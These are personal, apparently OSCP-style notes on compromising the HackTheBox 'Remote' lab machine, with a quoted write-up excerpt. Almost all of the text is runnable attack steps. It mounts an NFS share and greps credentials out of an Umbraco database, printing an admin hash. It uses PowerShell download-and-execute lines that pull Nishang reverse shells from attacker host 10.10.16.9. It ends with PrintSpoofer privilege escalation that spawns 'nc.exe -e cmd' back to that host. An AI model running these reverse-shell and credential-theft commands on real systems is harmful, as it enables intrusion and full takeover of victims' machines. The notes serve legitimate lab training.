mount -t nfs -o vers=2 10.129.95.194:/site_backups /mnt/remote -o nolock

sudo mount -t nfs -o vers=2 10.129.95.194:/site_backups /mnt/remote -o nolock

### Get the directory tree of the mount 
```
find . -ls > ~/home/user/web.dir
```

Don't use sublime or vscode. They miss files

### Go through config files, grep passwords
strings Umbraco.sdf | grep -i passwd
strings Umbraco.sdf | grep -i admin
strings Umbraco.sdf | grep -i admin@htb.local

adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50

### Those insdie strings so go start with /c
`/c ping 10.10.16.9`

### Solve Clock problem
1. try diff host <ip> or http://<ip> or http://<ip>/cms
2. change something like calc.exe or other placeholders to cmd.exe

### Shell
##### Avoid using Invoke-ConPtyShell.ps1
```
/c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.9/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell 10.10.16.9 4242
```

/c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.9/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.9 -Port 4242

https://0xdf.gitlab.io/2020/09/05/htb-remote.html
I’ll update the payload with the PowerShell loader that will download from my host a Nishang PowerShell reverse shell and run it. The payload will be:
```
string cmd = "/c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.16.9/Invoke-PowerShellTcp.ps1')";Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.9 -Port 4242
```
To break that down, the target exe is still cmd.exe. It will run with /c, so running the command that follow. PowerShell will start, with -c to issue commands that follow. iex (shorthand for Invoke-Expression) will run whatever string comes back from the rest of the line. The rest of the line will reach out to my host, and download shell.ps1 (which is then passed to iex).

I’ll grab a copy of Invoke-PowerShellTcp.ps1 (and save it as shell.ps1), and add a line at the bottom to execute the shell:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 443
```
Without this line, the harness would load the reverse shell functions into the PowerShell session, and but not use them. Now it will load the functions and then invoke the one I want to call back to me.

### Priv
cp winPEASx64.exe /home/alvin/Documents/OSCP-PWK/HackTheBox/Windows/Remote
IWR http://10.10.16.9/winPEASx64.exe -OutFile winPeas.exe

### Not working at 2021 Sep
```
PrintSpoofer64.exe -i -c cmd # is not recognized as the name of a cmdlet, function, script file
.\PrintSpoofer64.exe -i -c cmd # stuck
.\PrintSpoofer64.exe -i -c "powershell -c iex( iwr http://10.10.16.9/Invoke-PowerShellTcp.ps1 -UseBasicParsing );Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.9 -Port 4567"
.\PrintSpoofer64.exe -i -c "powershell -ep bypass"
```

### nc.exe is the only working one
```
IWR http://10.10.16.9/nc.exe -OutFile nc.exe
.\PrintSpoofer64.exe -c "C:\users\public\nc.exe 10.10.16.9 4567 -e cmd"
```

At least 3 ways to root(some of them are patched now)
1. Crack registry key:
https://0xdf.gitlab.io/2020/09/05/htb-remote.html
2. RoguePotato is nolonger working
3. https://0xdf.gitlab.io/2020/02/01/htb-re.html#path-1-abuse-usosvc
2. PrinterSpoof